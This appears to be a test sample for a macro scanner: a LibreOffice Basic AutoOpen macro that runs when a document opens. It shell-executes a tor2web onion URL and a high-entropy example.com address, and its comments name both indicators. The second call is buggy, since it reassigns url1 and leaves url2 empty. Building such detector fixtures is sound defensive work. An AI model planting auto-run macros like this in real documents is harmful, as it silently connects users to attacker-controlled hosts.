Sub AutoOpen()
	' tor2web
	Dim url1 As String
	url1 = "https://duskgytldkxiuqc6.onion.to/"
	
	Dim shell As Object
	shell = CreateUnoService("com.sun.star.system.SystemShellExecute")
	shell.execute(url1, "", 0)
	
	' high entropy
	Dim url2 As String
	url1 = "http://x8b4l3p2q9c1r7s0.example.com"
	
	Dim shell2 As Object
	shell2 = CreateUnoService("com.sun.star.system.SystemShellExecute")
	shell2.execute(url2, "", 0)

End Sub


